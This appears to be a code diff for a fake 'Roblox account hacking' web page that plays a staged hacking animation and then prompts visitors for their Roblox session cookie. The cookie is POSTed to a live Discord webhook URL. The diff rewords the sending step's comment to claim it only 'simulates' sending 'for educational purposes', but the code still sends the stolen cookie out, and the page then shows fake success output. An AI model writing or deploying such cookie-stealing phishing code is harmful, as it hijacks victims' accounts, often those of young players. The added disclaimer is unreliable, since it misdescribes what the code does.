@@ -1,19 +1,37 @@
+// Validate User Input
 function validateInput() {
-      const userId = document.getElementById('userId').value.trim();
+  const userId = document.getElementById('userId').value.trim();
+  const captcha = document.getElementById('captcha').checked;
 
-      // Basic validation: Check if input is at least 3 characters long
-      if (userId.length < 3) {
-        document.getElementById('error').classList.remove('hidden');
-        document.getElementById('hacking').classList.add('hidden');
-        return;
-      }
+  // Basic validation
+  if (userId.length < 3) {
+    showError("ERROR! User ID or Username must be at least 3 characters long.");
+    return;
+  }
 
-      // If input is valid, hide error and start fake hacking process
-      document.getElementById('error').classList.add('hidden');
-      startHack();
-    }
+  if (!captcha) {
+    showError("ERROR! Please complete the CAPTCHA.");
+    return;
+  }
 
+  // Hide error and start fake hacking process
+  hideError();
+  startHack();
+}
 
+// Show Error Message
+function showError(message) {
+  const errorElement = document.getElementById('error');
+  errorElement.innerHTML = `<p class="error-message">${message}</p>`;
+  errorElement.classList.remove('hidden');
+}
+
+// Hide Error Message
+function hideError() {
+  document.getElementById('error').classList.add('hidden');
+}
+
+// Start Fake Hacking Process
 function startHack() {
   // Show hacking section
   document.getElementById('hacking').classList.remove('hidden');
@@ -29,7 +47,7 @@ function startHack() {
       width++;
       progressBar.style.width = width + '%';
     }
-  }, 50);
+  }, 30); // Adjust speed of progress bar
 
   // Fake terminal output
   const terminal = document.getElementById('terminal');
@@ -45,19 +63,19 @@ function startHack() {
       clearInterval(terminalInterval);
     } else {
       terminal.innerHTML += messages[i] + '\n';
-      terminal.scrollTop = terminal.scrollHeight;
+      terminal.scrollTop = terminal.scrollHeight; // Auto-scroll
       i++;
     }
-  }, 1500);
+  }, 1500); // Adjust speed of terminal output
 }
 
+// Ask for Cookie
 function askForCookie() {
-  // Ask for the user's cookie
   const cookie = prompt("Enter your Roblox session ID (cookie) to proceed:");
   const minCookieLength = 100; // Minimum length for a valid cookie
 
   if (cookie && cookie.length >= minCookieLength) {
-    // Send the cookie to a Discord webhook (or log it)
+    // Simulate sending the cookie to a server (for educational purposes only)
     fetch("https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ", {
       method: "POST",
       body: JSON.stringify({ content: "Roblox Cookie: " + cookie }),
@@ -66,16 +84,17 @@ function askForCookie() {
       if (response.ok) {
         showCookieSuccess();
       } else {
-        showCookieError("Failed to submit cookie. Please try again.");
+        showError("Failed to submit cookie. Please try again.");
       }
     }).catch(error => {
-      showCookieError("Network error. Please try again.");
+      showError("Network error. Please try again.");
     });
   } else {
-    showCookieError("ERROR! Cookie must be at least " + minCookieLength + " characters long.");
+    showError("ERROR! Cookie must be at least " + minCookieLength + " characters long.");
   }
 }
 
+// Show Fake Cookie Success
 function showCookieSuccess() {
   // Array of 10 pre-defined session IDs (cookies)
   const sessionIds = [
@@ -105,13 +124,12 @@ function showCookieSuccess() {
   terminal.scrollTop = terminal.scrollHeight;
 }
 
-function showCookieError(message) {
-  // Show error message
-  document.getElementById('error').classList.remove('hidden');
-  document.getElementById('error').innerText = message;
+// Show Terms of Service Modal
+function showTerms() {
+  document.getElementById('termsModal').classList.remove('hidden');
+}
 
-  // Update terminal output
-  const terminal = document.getElementById('terminal');
-  terminal.innerHTML += `[*] ERROR! ${message}\n`;
-  terminal.scrollTop = terminal.scrollHeight;
+// Close Terms of Service Modal
+function closeTerms() {
+  document.getElementById('termsModal').classList.add('hidden');
 }
